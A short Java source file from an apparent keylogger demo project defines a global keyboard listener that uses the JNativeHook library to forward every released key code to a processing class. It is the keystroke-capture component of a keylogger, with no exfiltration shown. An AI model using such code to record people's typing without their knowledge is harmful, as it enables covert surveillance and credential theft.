package com.suchocki.keyloggerdemo.dataprocessing;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class GlobalKeyListener implements NativeKeyListener {

	private KeyProcesser keyProcesser;

	public GlobalKeyListener(KeyProcesser keyProcesser) {
		this.keyProcesser = keyProcesser;
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
		keyProcesser.addKey(nativeEvent.getKeyCode());
	}
}
